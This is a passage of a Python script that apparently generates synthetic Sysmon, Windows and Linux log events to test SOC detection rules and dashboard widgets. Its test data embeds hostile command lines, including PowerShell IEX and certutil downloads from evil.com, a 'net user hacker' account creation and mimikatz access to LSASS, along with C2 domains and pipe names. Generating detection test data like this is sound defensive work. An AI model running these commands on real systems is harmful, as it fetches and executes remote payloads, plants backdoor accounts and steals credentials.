        "DestinationPort": str(dest_port) if dest_port else "",
        "QueryName": query_name or "",
        "QueryResults": query_results or "",
        "PipeName": pipe_name or "",
        "TargetFilename": target_filename or "",
        "GrantedAccess": granted_access or "",
        "msg": msg or f"Sysmon Event {event_id}",
    }


def generate_sysmon_operational():
    """Generate Sysmon Operational events for multicloudoperations widgets."""
    events = []

    # ── Event 1: Process Creation ──
    procs = [
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -NoProfile -enc SQBFAFgA"),
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\whoami.exe",
         "whoami /all"),
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\net.exe",
         "net user hacker P@ssw0rd /add"),
        ("C:\\Windows\\explorer.exe", "C:\\Users\\Public\\malware.exe",
         "malware.exe --connect 185.215.113.206"),
        ("C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell.exe -ep bypass -c IEX(iwr http://evil.com/ps.ps1)"),
        ("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c certutil -urlcache -f http://evil.com/payload.exe"),
        ("C:\\Windows\\System32\\wbem\\wmiprvse.exe", "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c whoami"),
    ]
    for i, (parent, child, cmd) in enumerate(procs):
        for j in range(4):
            events.append(sysmon_op_event(
                1, source_image=parent, target_image=child,
                command_line=cmd,
                user=random.choice(THREAT_ACTORS),
                msg=f"Process Create: {child.split(chr(92))[-1]}",
                offset=i*5+j,
            ))

    # Extra Event 1 with suspicious parent processes (for the "Suspicious Process Chains" widget)
    suspicious_parents = [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\mshta.exe",
        "C:\\Windows\\System32\\wscript.exe",
        "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
    ]
    for i, parent in enumerate(suspicious_parents):
        for j in range(3):
            events.append(sysmon_op_event(
                1, source_image=parent,
                target_image=f"C:\\Windows\\System32\\{'cmd.exe' if j % 2 == 0 else 'powershell.exe'}",
                command_line=f"{'cmd.exe /c' if j % 2 == 0 else 'powershell.exe -ep bypass'} suspicious_command_{i}_{j}",
                user=random.choice(THREAT_ACTORS),
                msg="Process Create: suspicious child process",
                offset=100+i*5+j,
            ))

    # ── Event 3: Network Connections (C2 ports) ──
    c2_ports = [4444, 8443, 8080, 9090, 5555, 1337, 3333, 6666, 443]
    c2_ips = ["185.215.113.206", "103.253.41.45", "89.34.111.113", "5.252.178.48"]
    for i, port in enumerate(c2_ports):
        for j in range(3):
            events.append(sysmon_op_event(
                3,
                source_image=random.choice([
                    "C:\\Windows\\System32\\cmd.exe",
                    "C:\\Users\\Public\\beacon.exe",
                    "C:\\Windows\\System32\\powershell.exe",
                ]),
                dest_ip=random.choice(c2_ips),
                dest_port=port,
                dest_hostname=random.choice(["evil-c2.duckdns.org", "beacon.example.xyz", "update.evil.cc"]),
                user=random.choice(THREAT_ACTORS),
                msg=f"Network connection detected to port {port}",
                offset=200+i*4+j,
            ))

    # ── Event 8: CreateRemoteThread (Process Injection T1055) ──
    for i in range(8):
        events.append(sysmon_op_event(
            8,
            source_image=random.choice([
                "C:\\Users\\Public\\injector.exe",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Temp\\payload.exe",
            ]),
            target_image=random.choice([
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Windows\\System32\\explorer.exe",
                "C:\\Windows\\System32\\notepad.exe",
            ]),
            user=random.choice(THREAT_ACTORS),
            msg="CreateRemoteThread detected",
            offset=300+i,
        ))

    # ── Event 10: ProcessAccess to LSASS (T1003 Credential Dump) ──
    for i in range(8):
        events.append(sysmon_op_event(
            10,
            source_image=random.choice([
                "C:\\Temp\\mimikatz.exe",
                "C:\\Tools\\procdump.exe",
                "C:\\Windows\\System32\\rundll32.exe",
            ]),
            target_image="C:\\Windows\\System32\\lsass.exe",
            granted_access="0x1010",
            user=random.choice(THREAT_ACTORS),
            msg="Process accessed lsass.exe",
            offset=400+i,
        ))

    # ── Event 11: File Creation (Startup folder persistence T1547) ──
    startup_files = [
        "C:\\Users\\joffrey\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat",
        "C:\\Users\\arya\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
    ]
    for i, fname in enumerate(startup_files):
        for j in range(2):
            events.append(sysmon_op_event(
                11,
                source_image="C:\\Windows\\System32\\cmd.exe",
                target_filename=fname,
                user=random.choice(THREAT_ACTORS),
                msg=f"File created: {fname.split(chr(92))[-1]}",
                offset=500+i*3+j,
            ))

    # More Event 11: General file creates
    for i in range(6):
        events.append(sysmon_op_event(
            11,
            source_image="C:\\Windows\\System32\\powershell.exe",
            target_filename=f"C:\\Temp\\payload_{i}.exe",
            user=random.choice(THREAT_ACTORS),
            msg=f"File created: payload_{i}.exe",
            offset=520+i,
        ))

    # ── Event 17: Named Pipe Creation (C2 indicator) ──
    pipes = [
        "\\\\.\\pipe\\evil_pipe", "\\\\.\\pipe\\cobaltstrike",
        "\\\\.\\pipe\\meterpreter", "\\\\.\\pipe\\msf_rpc",
        "\\\\.\\pipe\\beacon_pipe",
    ]
    for i, pipe in enumerate(pipes):
        for j in range(2):
            events.append(sysmon_op_event(
                17,
                source_image="C:\\Windows\\System32\\cmd.exe",
                pipe_name=pipe,
                user=random.choice(THREAT_ACTORS),
                msg=f"Pipe Created: {pipe}",
                offset=600+i*3+j,
            ))

    # ── Event 22: DNS Queries ──
    # Suspicious TLDs for beaconing detection
    suspicious_domains = [
        "evil-c2.duckdns.org", "beacon.malware.xyz", "update.evil.info",
        "c2.attacker.top", "data.exfil.pw", "dns.tunnel.cc",
        "command.control.tk", "stealer.bad.bit",
    ]
    normal_domains = [
        "www.google.com", "login.microsoftonline.com", "api.github.com",
        "cdn.cloudflare.com",
    ]
    # Suspicious domain queries
    for i, domain in enumerate(suspicious_domains):
        for j in range(5):
            events.append(sysmon_op_event(
                22,
                source_image=random.choice([
                    "C:\\Windows\\System32\\cmd.exe",
                    "C:\\Users\\Public\\beacon.exe",
                    "C:\\Windows\\System32\\powershell.exe",
                ]),
                query_name=domain,
                query_results=random.choice(c2_ips),
                user=random.choice(THREAT_ACTORS),
                msg=f"DNS query: {domain}",
                offset=700+i*6+j,
            ))
    # Normal DNS queries (for contrast)
    for i, domain in enumerate(normal_domains):
        for j in range(3):
            events.append(sysmon_op_event(
                22,
                source_image="C:\\Windows\\System32\\svchost.exe",
                query_name=domain,
                query_results="142.250.80.46",
                user="SYSTEM",
                msg=f"DNS query: {domain}",
                offset=800+i*4+j,
            ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Main Orchestrator
# ═══════════════════════════════════════════════════════════════════

def write_jsonl(filepath, events):
    """Write events as NDJSON (one JSON object per line)."""
    with open(filepath, 'w') as f:
        for event in events:
            f.write(json.dumps(event, default=str) + "\n")
    return len(events)


def main():
    parser = argparse.ArgumentParser(description="Generate test detection logs")
    parser.add_argument("--validate", action="store_true",
                        help="Validate that all query files have matching test events")
    args = parser.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print("=" * 60)
    print("Generating Attack Simulation Test Logs (NDJSON)")
    print("=" * 60)

    # Generate events — original SOC detection rule sources
    oci_events = generate_oci_audit_events()
    cg_events = generate_cloud_guard_events()
    linux_events = generate_linux_events()
    windows_events = generate_windows_events()

    # Generate events — multicloudoperations widget-compatible sources
    winsec_events = generate_windows_event_security()
    winsys_events = generate_windows_event_system()
    linsec_events = generate_linux_secure()
    sysmon_events = generate_sysmon_operational()

    # Write NDJSON files
    results = {}
    files = [
        ("oci_audit.jsonl", oci_events),
        ("cloud_guard.jsonl", cg_events),
        ("linux_syslog.jsonl", linux_events),
        ("windows_sysmon.jsonl", windows_events),
        ("windows_event_security.jsonl", winsec_events),
        ("windows_event_system.jsonl", winsys_events),
        ("linux_secure.jsonl", linsec_events),
        ("sysmon_operational.jsonl", sysmon_events),
    ]

    for filename, events in files:
        filepath = OUTPUT_DIR / filename
        count = write_jsonl(filepath, events)
        results[filename] = count
        print(f"  {count:>5} events -> {filepath}")

    # Write manifest
    manifest = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "files": {name: {"event_count": count} for name, count in results.items()},
        "total_events": sum(results.values()),
    }
    manifest_path = OUTPUT_DIR / "manifest.json"
    with open(manifest_path, 'w') as f:
        json.dump(manifest, f, indent=2)

    print(f"\n  Total: {sum(results.values())} events across {len(results)} files")
    print(f"  Manifest: {manifest_path}")

    if args.validate:
        print("\n  Validating query coverage...")
        query_files = list(QUERIES_DIR.glob("*.json"))
        print(f"  Found {len(query_files)} query files")
        print("  (Full validation requires OCI LA to parse and match fields)")

    print(f"\nNext: python3 scripts/ingest_test_data.py")


if __name__ == "__main__":
    main()
